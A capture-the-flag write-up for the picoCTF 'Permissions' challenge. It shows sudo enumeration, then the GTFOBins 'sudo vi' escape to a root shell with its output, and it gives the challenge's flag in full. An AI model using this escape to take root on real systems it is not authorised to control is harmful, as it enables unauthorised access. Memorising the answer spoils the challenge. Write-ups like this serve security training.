---
tags:
  - GTFO-Bins
  - priv-escalation
created: 2023-10-18
last_modified_at: 2024-02-04
---
# Permissions
---
### Description
---
Can you read files in the root file?

Additional details will be available after launching your challenge instance.
### Hints
---

> [!hint]- Hint(s)
> 1. https://gtfobins.github.io/gtfobins/vi/#sudo

### Step(s)
---
1. You first should find if the current user has any sudo permissions by using the command `sudo -l` 
	```bash
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

2. We see that we have permission to run vi with sudo. Checking GTFOBins we see that we can use the command `sudo vi -c ':!/bin/sh' /dev/null` which will give us root shell
3. just for viewing pleasure I usually will run `/bin/bash` to get a bash shell which is just more appealing and allows for using the up and down arrows
4. The root flag can be found as a "hidden" file in the root folder
```bash
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null

# whoami
root
# ls /root
# ls -ahl /root
total 12K
drwx------ 1 root root   23 Aug  4 21:33 .
drwxr-xr-x 1 root root   51 Oct 17 17:50 ..
-rw-r--r-- 1 root root 3.1K Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4 21:33 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```

### Flag
---
> [!question]- Flag
> picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}







